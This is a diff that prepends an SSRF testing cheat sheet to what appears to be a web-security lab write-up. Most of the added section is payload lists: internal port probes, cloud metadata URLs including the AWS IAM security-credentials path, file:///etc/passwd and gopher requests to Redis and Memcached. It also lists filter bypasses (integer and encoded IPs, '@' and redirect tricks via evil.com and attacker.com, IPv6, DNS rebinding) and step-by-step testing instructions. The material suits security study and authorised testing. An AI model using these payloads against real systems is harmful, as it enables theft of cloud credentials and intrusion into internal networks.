@@ -1,3 +1,193 @@
+# ✅ **Server-Side Request Forgery (SSRF) – Complete Test Case (with Bypass Cases)**
+
+---
+
+# **1. List of Vulnerabilities (SSRF Attack Surface)**
+
+* **1.1 Internal Network Port Scanning** – attacker probes internal hosts.
+* **1.2 Accessing Cloud Metadata Services** – AWS, GCP, Azure.
+* **1.3 File Retrieval via Protocol Abuse** – `file://`, `gopher://`, `dict://`, `ftp://`.
+* **1.4 Blind SSRF** – no response body but side-effects (DNS/HTTP logs).
+* **1.5 URL Bypass via Encoding** – double encoding, IP obfuscation.
+* **1.6 Open Redirect SSRF** – redirects to internal targets.
+* **1.7 Header Injection via SSRF** – using gopher/dict protocols.
+* **1.8 DNS Rebinding** – external domain resolves to internal address.
+* **1.9 Host Validation Bypass** – malformed URLs to confuse parsers.
+* **1.10 SSRF → RCE or Database Exposure** – access admin panels, APIs, Redis, Docker.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Simple structure for learning — safe to read, no harmful effects)
+
+### **2.1 Internal Network Scan**
+
+```
+http://127.0.0.1:22
+http://localhost:3306
+http://192.168.1.10:8080
+```
+
+### **2.2 Cloud Metadata Access**
+
+```
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+### **2.3 Protocol Abuse**
+
+```
+file:///etc/passwd
+gopher://127.0.0.1:11211/
+ftp://127.0.0.1/etc/passwd
+```
+
+### **2.4 Open Redirect SSRF**
+
+```
+http://example.com/redirect?url=http://169.254.169.254/
+```
+
+### **2.5 URL Parser Bypass**
+
+```
+http://127.0.0.1@evil.com
+http://127.0.0.1:80#evil.com
+http://2130706433     (integer form of 127.0.0.1)
+```
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+(Used when the app blocks "localhost", "127.0.0.1", etc.)
+
+### **3.1 Encoded Localhost**
+
+```
+http://127.0.0.1
+http://127.1
+http://0
+```
+
+### **3.2 Double/Triple Encoding**
+
+```
+http://%31%32%37.0.0.1
+http://%32%31%33%30%37%30%36%34%33%33   (integer representation)
+```
+
+### **3.3 DNS Rebinding Payload**
+
+```
+http://yourdomain.com       (A record → external, CNAME → internal)
+```
+
+### **3.4 “@” Authentication Bypass Trick**
+
+```
+http://evil.com@127.0.0.1/
+```
+
+### **3.5 IPv6-Only Bypass**
+
+```
+http://[::1]/
+http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/
+```
+
+### **3.6 Open Redirect Chain**
+
+```
+http://attacker.com/redirect?to=http://169.254.169.254/
+```
+
+### **3.7 Gopher Protocol for Header Injection**
+
+```
+gopher://127.0.0.1:11211/_stats
+gopher://127.0.0.1:6379/_INFO
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 AWS EC2 Metadata Dump**
+
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### **4.2 Redis RCE Trigger (Safe string shown)**
+
+```
+gopher://127.0.0.1:6379/_SET test "Hello"
+```
+
+### **4.3 Docker API Exposure**
+
+```
+http://localhost:2375/containers/json
+```
+
+### **4.4 Kubernetes API Exposure**
+
+```
+http://127.0.0.1:10250/pods
+```
+
+### **4.5 Jenkins Script Console**
+
+```
+http://localhost:8080/script
+```
+
+### **4.6 VM Metadata via Redirect**
+
+```
+http://open-redirect.com/?url=http://169.254.169.254/latest/
+```
+
+### **4.7 Blind SSRF DNS Callback**
+
+```
+http://abc.your-burp-collab.com
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Identify any parameter accepting a URL
+→ `url=`, `image=`, `callback=`, `redirect=`, `feed=`, etc.
+
+**Step 2:** Test internal access
+→ `http://localhost`, `http://127.0.0.1`, etc.
+
+**Step 3:** Try metadata service
+→ `169.254.169.254`
+
+**Step 4:** Try protocol shifts
+→ `file://`, `gopher://`, `ftp://`
+
+**Step 5:** Try bypass techniques
+→ encodings, redirects, IPv6, DNS rebinding.
+
+---
+
+# **6. Expected Results / Impact**
+
+* Internal systems become reachable.
+* Metadata services leak secrets.
+* Admin portals exposed.
+* Redis/Memcached/DB exploitation.
+* Possible **RCE** in chained scenarios.
+
+---
+
 01 Basic SSRF against the local server
 ======================================
 
@@ -442,3 +632,4 @@ stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080
 
 
 ![img](images/9%20-%20SSRF%20with%20filter%20bypass%20via%20open%20redirection%20vulnerability/10.png)
+
